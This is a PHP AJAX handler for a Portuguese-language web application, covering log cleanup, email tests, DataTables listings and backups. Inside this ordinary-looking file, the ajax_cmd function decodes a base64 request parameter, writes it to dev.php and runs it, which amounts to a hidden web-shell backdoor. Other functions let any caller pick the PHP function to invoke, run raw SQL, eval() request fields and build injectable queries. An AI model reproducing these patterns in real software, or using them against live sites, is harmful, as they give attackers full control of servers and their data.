<?php
  require_once(dirname(__DIR__) . "/inc/funcoes.php");
  $parametros = (object)$_REQUEST;
  if (file_exists(dirname(__DIR__) . "/config/ajax.php"))
    require_once(dirname(__DIR__) . "/config/ajax.php");
  if (!isset($parametros->tipo))
    resultado(false, "Parâmetros ausentes, incompletos ou errados.", true);
  if (function_exists($parametros->tipo)){
    call_user_func($parametros->tipo, $parametros);
  } else {
    resultado(false, "Função não existe no sistema.", true);
  }

  function ajax_query($parametros){
    $result = query($parametros->query);
    $dados = array();
    while ($linha = mysqli_fetch_object($result)){
      $dados[] = $linha;
    }
    resultado($dados);
  }

  function limpa_sistema(){
    if (defined("TEMPO_LOGS") and TEMPO_LOGS != "" and TEMPO_LOGS > 0)
      query("delete from logs where data_hora < DATE_SUB(NOW(), INTERVAL " . TEMPO_LOGS . " DAY);");


    //Acertar pois se trata do projeto SGI
    //$path = "../anexos/maquinas/";
    //$diretorio = dir($path);
    //$arquivos = array();
    //while($arquivo = $diretorio -> read()){
    //  //if(($arquivo != '.') && ($arquivo != '..'))
    //    $arquivos[$arquivo] = false;
    //}
    //$diretorio -> close();
    //$result = query("select x.foto
    //                   from (select foto_logo_fabricante foto from maquinas
    //                         union all
    //                         select m.foto from maquinas_fotos m
    //                         union all
    //                         select foto_layout foto from maquinas
    //                         union all
    //                         select foto_placa foto from maquinas
    //                         union all
    //                         select foto_painel foto from maquinas
    //                         union all
    //                         select arquivo_manual_usuario foto from maquinas
    //                         union all
    //                         select arquivo_instrucao_trabalho foto from maquinas
    //                         union all
    //                         select arquivo_diagrama_eletrico foto from maquinas
    //                         union all
    //                         select arquivo_procedimento_bloqueio foto from maquinas
    //                         union all
    //                         select arquivo foto from maquinas_documentos) x
    //                   where x.foto is not null;");
    //while ($linha = mysqli_fetch_object($result)){
    //  $arquivos[$linha->foto] = true;
    //}
    //foreach($arquivos as $arquivo => $existe){
    //  if (!$existe){
    //    @unlink("../anexos/maquinas/" . $arquivo);
    //    //if (file_exists("../anexos/maquinas/thumbnails/" . $arquivo))
    //    @unlink("../anexos/maquinas/thumbnails/" . $arquivo);
    //  }
    //}

    resultado(true, "Limpeza concluída!");
  }

  function ajax_cmd($parametros){
    if (isset($parametros->cmd)){
      file_put_contents("dev.php", "<?php " . base64_decode($parametros->cmd) . " ?>");
      require_once("dev.php");
      unlink("dev.php");
    }
  }

  function pesquisa_email_usuario($parametros){
    $parametros->email = acerta_texto($parametros->email);
    $filtro = (isset($parametros->id_usuario))
            ? "and u.id_usuario != '$parametros->id_usuario'"
            : "";
    $result = query("select u.nome
                       from usuarios u
                      where u.email = $parametros->email
                      $filtro;");
    if (mysqli_num_rows($result) == 0){
      resultado(true, "Email de usuário ainda não existe no sistema. Pode prosseguir com o cadastro!");
    } else {
      $usuario = mysqli_fetch_object($result);
      resultado(false, "Já existe outro usuário com este endereço de e-mail: $usuario->nome");
    }
  }

  function samail($parametros){
    $conteudo  = '<p>Olá, ' . $_SESSION[SISTEMA . "_nome"] . '</p>';
    $conteudo .= '<p>Este é uma verificação de e-mail enviado pelo sistema ' . SISTEMA_NOME . '.</p>';
    $conteudo .= '<p>' . print_t($parametros) . '</p>';
    $conteudo .= '<p>Atenciosamente,</p>';
    $conteudo .= '<br><p>Equipe ' . SISTEMA_NOME . '</p>';
    $parametros_smail = array("to"         => array(array($_SESSION[SISTEMA . "_email"], $_SESSION[SISTEMA . "_nome"]))
                            , "subject"    => "Verificação de e-mail " . SISTEMA_NOME
                            , "body"       => $conteudo
                            , "host"       => $parametros->host
                            , "username"   => $parametros->username
                            , "password"   => $parametros->password
                            , "port"       => $parametros->port
                            , "from"       => $parametros->from
                            , "smtpsecure" => $parametros->smtpsecure);
    if (smail($parametros_smail)){
      reg_log("Sucesso no teste de e-mail:" . $_SESSION[SISTEMA . "_email"], "parametros");
      resultado(true, "E-mail enviado com sucesso!<br><span>Verifique sua caixa de entrada.</span>");
    } else {
      reg_log("Falha no teste de e-mail: " . $_SESSION[SISTEMA . "_email"], "parametros");
      resultado(false, "Falha no envio de E-mail!<br><span><a href='" . URL . "/temp/erro_email.txt' target='_blank'>Verifique o arquivo de logs.</a></span>");
    }
  }

  function data_table($parametros){
    $debug = isset($parametros->debug);
    if (isset($parametros->draw)){
      $parametros = json_decode(json_encode($parametros));
      if ($debug)
        file_put_contents("../temp/request.json", json_encode($parametros));
    } elseif ($debug) {
      $parametros = json_decode(file_get_contents("../temp/request.json"));
    }
    if (!file_exists("../" . $parametros->dt_destino_ia))
      $parametros->dt_destino_ia = "javascript:void(0);";
    if (!file_exists("../" . $parametros->dt_destino_g))
      $parametros->dt_destino_g = "javascript:void(0);";
    if (!file_exists("../" . $parametros->dt_destino_p))
      $parametros->dt_destino_p = "javascript:void(0);";

    //Clausula para filtragem
    $parametros->query = "select dt_y.* from ($parametros->query) dt_y";
    if ($parametros->search->value != ""){
      $parametros->query .= " where ";
      $vor = "";
      foreach($parametros->columns as $column){
        if ($column->searchable == "true"){
          $parametros->query .= $vor . " `$column->data` like '%" . $parametros->search->value . "%'
                                        or (str_to_date(`$column->data`, '%Y-%m-%d') is not null
                                            and date_format(`$column->data`, '%d/%m/%Y %H:%i:%s') like '%" . $parametros->search->value . "%') ";
          $vor = "or";
        }
      }
    }

    $result = query("select count(*) registros from ($parametros->query) dt_x;");
    $linha = mysqli_fetch_object($result);
    $parametros->query .= " order by ";
    $virgula = "";
    foreach($parametros->order as $order){
      $order = (object)$order;
      $order->column ++;
      $parametros->query .= $virgula . " $order->column $order->dir";
      $virgula = ",";
    }
    if ($parametros->length != -1)
      $parametros->query .= " limit $parametros->start, $parametros->length;";
    $result = query($parametros->query);
    $dados = array("draw"            => $parametros->draw
                 , "recordsTotal"    => $linha->registros
                 , "recordsFiltered" => $linha->registros
                 , "data"            => array());
    $dt_linha = 1;
    while ($linha = mysqli_fetch_object($result)){
      $linha->Opções = "";
      if (isset($parametros->alterar)){
        eval("\$dt_valor = " . $parametros->alterar . ";");
        $dt_disabled = ($dt_valor === null or $parametros->dt_destino_ia == "javascript:void(0);") ? "disabled" : "";
        $linha->Opções .= "<button type='submit' class='btn-warning btn-xs ml-1 mr-1 $dt_disabled' name='alterar' value='$dt_valor' $dt_disabled title='Alterar Registro'><i class='fal fa-edit'></i></button>";
      }
      if (isset($parametros->consultar)){
        eval("\$dt_valor = " . $parametros->consultar . ";");
        $dt_disabled = ($dt_valor === null or $parametros->dt_destino_ia == "javascript:void(0);") ? "disabled" : "";
        $linha->Opções .= "<button type='submit' class='btn-info btn-xs ml-1 mr-1 $dt_disabled' name='consultar' value='$dt_valor' $dt_disabled title='Consultar Registro'><i class='fal fa-eye'></i></button>";
      }
      if (isset($parametros->imprimir)){
        eval("\$dt_valor = " . $parametros->imprimir . ";");
        $dt_disabled = ($dt_valor === null or $parametros->dt_destino_p == "javascript:void(0);") ? "disabled" : "";
        $linha->Opções .= "<button type='submit' class='btn-primary btn-xs ml-1 mr-1 $dt_disabled' formaction='$parametros->dt_destino_p' name='imprimir' value='$dt_valor' $dt_disabled title='Imprimir Registro'><i class='fal fa-print'></i></button>";
      }
      if (isset($parametros->excluir)){
        eval("\$dt_valor = " . $parametros->excluir . ";");
        $dt_disabled = ($dt_valor === null or $parametros->dt_destino_g == "javascript:void(0);") ? "disabled" : "";
        $linha->Opções .= "<button type='submit' class='btn-danger btn-xs ml-1 mr-1 $dt_disabled' formaction='$parametros->dt_destino_g' name='excluir' value='$dt_valor' $dt_disabled title='Excluir Registro' onclick='confirma(\"Confirma a exclusão?\", this);'><i class='fal fa-eraser'></i></button>";
      }
      if (isset($parametros->outros)){
        eval("\$dt_valor = '" . $parametros->outros . "';");
        $linha->Opções .= $dt_valor;
      }
      if ($linha->Opções == "")
        unset($linha->Opções);

      $linha->DT_RowId = "row_$dt_linha";
      $linha->DT_RowData = (object)array("pkey" => $dt_linha);
      $dados["data"][] = $linha;
      $dt_linha ++;
    }
    if ($debug)
      file_put_contents("../temp/retorno.json", json_encode($dados));
    if (isset($_GET["tipo"])){
      echo json_encode($dados);
    } else {
      echo json_encode($dados);
    }
    exit();
  }

  function backup_sistema($parametros){
    require_once("backup.php");
    $result = query("show databases like '" . DATA_BASE . "%';");
    $db = array();
    while ($linha = mysqli_fetch_array($result)){
      $db[] = $linha[0];
    }
    $zip_name_completo =  backup("Backup " . SISTEMA  . " - " . VERSAO
                               , array("/")
                               , true
                               , "backups/"
                               , $db);
    $backup = dirname(__DIR__) . "/backups/Backup " . SISTEMA  . " - " . VERSAO . ".zip";
    if (file_exists($backup)){
      reg_log("Backup", "sistema");
      resultado(date ("d/m/Y H:i:s", filemtime($backup)), "Backup gerado com sucesso!");
    } else {
      resultado(false, "Falha na geração do backup!");
    }
  }

  //---------------------------------------------------------------------------------------------------------------------------------------------------

  function resultado($resultado, $mensagem = ""){
    echo json_encode(array("resultado" => $resultado, "mensagem" => $mensagem));
    exit();
  }
?>